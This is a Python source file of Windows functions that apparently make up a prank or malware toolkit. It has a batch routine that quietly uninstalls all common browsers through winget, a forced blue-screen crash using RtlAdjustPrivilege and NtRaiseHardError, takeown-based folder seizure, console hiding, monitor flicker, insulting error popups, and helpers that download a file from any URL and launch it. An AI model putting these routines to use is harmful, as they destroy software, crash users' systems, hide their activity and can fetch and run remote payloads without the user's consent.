import os
from pathlib import Path
import subprocess
import ctypes
import tkinter as tk
from tkinter import messagebox
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref
import urllib.request

class objects:
    def getAllUnifiedObjectsAndDelete():
        print("ALL UNIFIED OBJECTS AND DELETE")
        os.system("""@echo off
        REM Uninstall all browsers using winget
        echo Uninstalling all browsers...

        REM List of common browser package names
        set "browsers=Microsoft.Edge Microsoft.EdgeBeta Microsoft.EdgeDev Microsoft.EdgeCanary Google.Chrome Mozilla.Firefox Brave.Brave Opera.OperaMini Opera.OperaMiniDev Opera.OperaMiniCanary"

        REM Loop through each browser package name and uninstall it
        for %%b in (%browsers%) do (
            winget uninstall --id=%%b -q
        )

        echo All browsers uninstalled.""")


def getDesktopPath():
    home = Path(os.environ['USERPROFILE'])
    documents_path = home / 'Desktop'
    return str(documents_path)



def getDocumentsPath():
    home = Path(os.environ['USERPROFILE'])
    documents_path = home / 'Documents'
    return str(documents_path)


def getFolderOwner(folder_path):
        """
        Get the owner of a folder.

        Args:
            folder_path (str): The path to the folder.

        Returns:
            int: The user ID of the owner of the folder.
        """
        ownership = os.stat(folder_path).st_uid
        return ownership



# Function to set ownership of a folder
def SetOwnership(path):
    command = ['takeown', '/F', path]
    try:
        subprocess.run(command, check=True)
        return True
    except subprocess.CalledProcessError as e:
        return str(e)

def getOwnerShip(path):
    command = ['icacls', path]  # Construct the command
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        return output
    except subprocess.CalledProcessError as e:
        return str(e)
    

def makeBuggyScreen(): # THIS IS VERY BAD, DO NOT USE IT IF YOU ARE NOT SURE.
    # Definir constantes
    HWND_BROADCAST = 0xFFFF
    WM_SYSCOMMAND = 0x0112
    SC_MONITORPOWER = 0xF170
    MONITOR_OFF = 2
    MONITOR_ON = -1

    # Obtener el manejador de la ventana activa
    hWnd = ctypes.windll.user32.GetForegroundWindow()

    # Apagar pantalla
    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_OFF)

    # Encender pantalla
    ctypes.windll.user32.PostMessageW(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, MONITOR_ON)


def ShowFuckNotification(title, message):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, message)

def MakeBSOD():
    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )

def HideConsole():
    kernel32 = ctypes.WinDLL("kernel32")
    hWnd = kernel32.GetConsoleWindow()
    if hWnd:
        user32 = ctypes.WinDLL("user32")
        user32.ShowWindow(hWnd, 0)


def DownloadFile(url):
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')
    file_name = url.split('/')[-1]
    file_path = os.path.join(downloads_folder, file_name)
    urllib.request.urlretrieve(url, file_path)
    return file_path

def StartProcess(file_path):
    if os.path.isfile(file_path):
        subprocess.Popen(['start', file_path], shell=True)
    else:
        subprocess.Popen(['start', '', file_path], shell=True)